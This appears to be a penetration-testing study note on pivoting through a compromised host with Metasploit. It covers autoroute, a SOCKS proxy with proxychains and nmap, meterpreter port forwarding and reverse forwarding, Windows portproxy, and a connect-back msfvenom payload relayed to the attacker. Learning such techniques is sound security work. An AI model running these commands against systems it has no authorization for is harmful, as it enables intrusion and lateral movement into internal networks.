> This section is a collection of pivoting techniques. Mainly commands with the metasploit framework

Through pivoting it is possible to scan/enumerate/exploit targets in a new subnet or behind a firewall/DMZ from a bastion host (host acts as some kind of proxy).

## Enable pivoting through an established meterpreter session

### 0. Prerequisites

- established meterpreter session on a host
- Victim host must have connection to other NW or machine

### 1. Create a route into another network

```bash
msf> use post/multi/manage/autoroute
msf> set SESSION 1  # session on bastion host
msf> set SUBNET 10.10.10.0  # target network
msf> set NETMASK /16  # if different from /24
msf> run
```

Routes can be display with the `route` command in the console.

Also they can be added 'manually':

```bash
msf> route add <networkIP> <subnetMask> <sessionNumber>
msf> route add <networkIP>/24 <sessionsNumber>
```

### 2. Using the Pivot within metasploit frameowrk

This should be working already. If traffic is to go to the network covered by the defined route, metasploit will handly it automatically.

### 3. Start the `SOCKS` proxy for outside tools to pivot

```bash
msf> use auxiliary/server/socks_proxy
msf> set VERSION 4a  # optionally version 5 works also
msf> run
```

Socks proxy is started as a job in metasploit and runs in the background (check via `jobs` command).

- Also check if local config for proxychains matches the `PORT` and `VERSION` parameter stated within metasploit.

```bash
sudo nano /etc/proxychains4.conf  # or similar config name
> version 4a  # if using version 4
> port 1080
```

With this config and metasploit running the socks server, we can use `proxychains` in order to use other tools over this tunnel.

### 4. Use `proxychains` with `nmap`

> Remember: `SOCKS` is a service on the upper layers of the OSI model - `ICMP` and other low-level functions will not work with proxychains!

```bash
# scan ftp port with nmap
sudo proxychains nmap -Pn -sTV -n -p21 <targetIP>

# scan top 50 (most common) ports with nmap
sudo proxychains nmap -sT -Pn -n <targetIP> --top-ports 50
```

## Portforwarding

> This is crucial if we want to reach another machine not capable of reaching the web or the IP-Range where the attacker resides!
> 
> Using metasploit

```bash
meterpreter> portfwd add -l <localPort> -r <targetIP> -p <targetPort>
meterpreter> portfwd add -l 3333 -r 10.0.0.15 -p 3389
```

Example above: `RDP` connect to local port 3333 will actually goto 10.0.0.15:3389

![[m6_portforward.png]]

Listener on attacker machine forwarding traffic to the target over the compromised host. Requires an already exploited victim to use as intermediary.

**IMPORTANT:**
This procedure is possible on linux and windows - BUT it will block the port on the attacker machine (so  you can jump from your local 3333 to the remote target machine 3389):

```bash
netstat -tulpn

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      54056/ruby          
```

### REVERSE portforwarding

> So the target machine has a route back over the exploited machine

```bash
# meterpreter on the exploited machine 10.10.10.15
meterpreter> portfwd add -l <attackerPort> -L <attackerIP> -p <exploitedMachinePort> -R  # -R indicating reverse portfwd
```

### For Windows

> Using meterpreter (again) -> routes to the remote NW should already exist

```bash
msf> use post/windows/manage/portproxy
msf> set connect_port 3333 <attackerPort>
msf> set connect_address <attackerIP>
msf> set local_address <exploitedMachine> # 10.10.10.15 in above img
msf> set local_port <exploitMachinePort> # 3333 or 3389 as seen above
msf> set session 1 # meterpreter session playing the proxy
```

Traffice is piped over the exploited machine from the target machine to the attacker!

### Followup

> You can address an exploited machine as receiving end of an exploit -> but only if there is already meterpreter running on it and the traffic is forwarded to the attacker

For ease of use we can create a payload with msfvenom pointing to the exploited machine (which forwards the traffic on the specific port to the attacker IP) -> upload (this port must also be forwarded) and execute on the new target to get a connect-back in metasploit.